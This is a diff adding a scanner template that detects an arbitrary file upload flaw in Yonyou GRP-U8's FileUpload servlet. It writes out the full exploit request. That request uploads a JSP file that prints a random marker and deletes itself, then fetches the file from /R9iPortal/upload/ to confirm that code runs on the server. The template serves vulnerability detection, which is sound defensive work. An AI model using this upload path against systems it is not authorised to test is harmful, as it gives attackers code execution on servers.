@@ -1,0 +1,35 @@
+id: yonyou-grp-u8-fileupload
+
+info:
+  name: 用友 GRP U8 FileUpload存在任意文件上传漏洞
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    用友 GRP-U8 FileUpload接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。
+    faofa: "用友GRP-U8"
+  references:
+    - https://mp.weixin.qq.com/s/SFP8djDK-je1IzINSG3Ltw
+  tags: yonyou,fileupload
+  created: 2025/02/24
+
+set:
+  rboundary: randomLowercase(8)
+  filename2: randomLowercase(8)
+  exp: randomLowercase(18)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /servlet/FileUpload?fileName={{filename2}}.jsp&actionID=update
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: |
+        <% out.println("{{exp}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /R9iPortal/upload/{{filename2}}.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes(exp))
+expression: r0() && r1()
